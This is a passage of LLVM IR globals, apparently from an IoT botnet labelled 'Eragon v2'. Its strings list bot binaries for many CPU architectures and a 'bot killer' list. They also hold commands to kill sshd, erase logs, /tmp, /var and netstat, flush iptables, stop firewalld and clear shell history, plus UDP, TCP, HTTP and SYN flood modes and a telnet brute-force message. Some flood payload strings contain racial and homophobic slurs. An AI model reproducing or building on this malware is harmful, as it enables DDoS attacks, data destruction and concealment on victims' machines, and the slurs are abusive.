@.str.228 = private unnamed_addr constant [8 x i8] c"bot.sh4\00", align 1
@.str.229 = private unnamed_addr constant [10 x i8] c"botnt.x86\00", align 1
@.str.230 = private unnamed_addr constant [11 x i8] c"botnt.mips\00", align 1
@.str.231 = private unnamed_addr constant [11 x i8] c"botnt.mpsl\00", align 1
@.str.232 = private unnamed_addr constant [10 x i8] c"botnt.arm\00", align 1
@.str.233 = private unnamed_addr constant [12 x i8] c"botnt.arm5n\00", align 1
@.str.234 = private unnamed_addr constant [11 x i8] c"botnt.arm7\00", align 1
@.str.235 = private unnamed_addr constant [10 x i8] c"botnt.ppc\00", align 1
@.str.236 = private unnamed_addr constant [10 x i8] c"botnt.spc\00", align 1
@.str.237 = private unnamed_addr constant [11 x i8] c"botnt.m68k\00", align 1
@.str.238 = private unnamed_addr constant [10 x i8] c"botnt.sh4\00", align 1
@Bot_Killer_Binarys = global [176 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.238, i32 0, i32 0)], align 16
@buf = common global i8 0, align 1
@.str.239 = private unnamed_addr constant [13 x i8] c"kill -9 %s\0D\0A\00", align 1
@.str.240 = private unnamed_addr constant [30 x i8] c"killall -9 sshd;pkill -9 sshd\00", align 1
@input = common global [1024 x i8] zeroinitializer, align 16
@.str.241 = private unnamed_addr constant [19 x i8] c"ps -C sshd -o pid=\00", align 1
@output = common global [1024 x i8] zeroinitializer, align 16
@.str.242 = private unnamed_addr constant [11 x i8] c"kill -9 %s\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [32 x i8] c"yvr4rxgp60fgvmeerwaxqbum8aea9z4\00", align 16
@pids = common global i32* null, align 8
@.str.243 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.244 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@.str.245 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.246 = private unnamed_addr constant [30 x i8] c"Eragon Bruted -> %s [ %s:%s ]\00", align 1
@.str.247 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.248 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.249 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.250 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.251 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.252 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.253 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.254 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.255 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.256 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.257 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.258 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.259 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.260 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.261 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.262 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.263 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.264 = private unnamed_addr constant [15 x i8] c"niggaNiggerXds\00", align 1
@.str.265 = private unnamed_addr constant [10 x i8] c"muchpower\00", align 1
@.str.266 = private unnamed_addr constant [9 x i8] c"9XdSldsd\00", align 1
@.str.267 = private unnamed_addr constant [12 x i8] c"Xddsslslsls\00", align 1
@.str.268 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.269 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.270 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.271 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.272 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.273 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.274 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.275 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.276 = private unnamed_addr constant [5 x i8] c"smac\00", align 1
@.str.277 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.278 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.279 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.280 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.281 = private unnamed_addr constant [13 x i8] c"eRaGonBotNet\00", align 1
@.str.282 = private unnamed_addr constant [12 x i8] c"suckmyFOUND\00", align 1
@.str.283 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.284 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.285 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.286 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.287 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.288 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.289 = private unnamed_addr constant [7 x i8] c"Eragon\00", align 1
@.str.290 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.291 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.292 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.293 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.294 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.295 = private unnamed_addr constant [12 x i8] c"kadenthegod\00", align 1
@.str.296 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.296, i32 0, i32 0)], align 16
@.str.297 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.298 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@botnetPid = common global i32 0, align 4
@.str.299 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.300 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.301 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.302 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.303 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.304 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.305 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.306 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.307 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.308 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.309 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.310 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.311 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.312 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.313 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.314 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.315 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.316 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.317 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.318 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.319 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.320 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.321 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.322 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.323 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.324 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.325 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.326 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.327 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.328 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.329 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.330 = private unnamed_addr constant [48 x i8] c"[ ERAGON ] \1B[96m[%s] \1B[97mConnected -> %s -> %s\00", align 1
@.str.331 = private unnamed_addr constant [10 x i8] c"Eragon v2\00", align 1
@.str.332 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@.str.333 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
